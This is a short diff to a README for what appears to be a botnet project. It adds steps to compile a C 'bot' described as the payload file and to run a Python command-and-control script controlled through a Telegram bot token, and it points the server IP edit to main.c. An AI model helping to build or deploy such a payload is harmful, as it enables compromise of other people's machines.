@@ -19,8 +19,14 @@ pip3 install python-telegram-bot threading
 
 ### Editing
 
-* Edit IP server in bot.c
+* Edit IP server in main.c
 * Edit Telegram Bot Token in cnc.py
+
+### Building and Running
+
+* gcc bot/*.c -o bot
+* python3 cnc.py
+* "bot" is payload file
 
 ### Functions
 
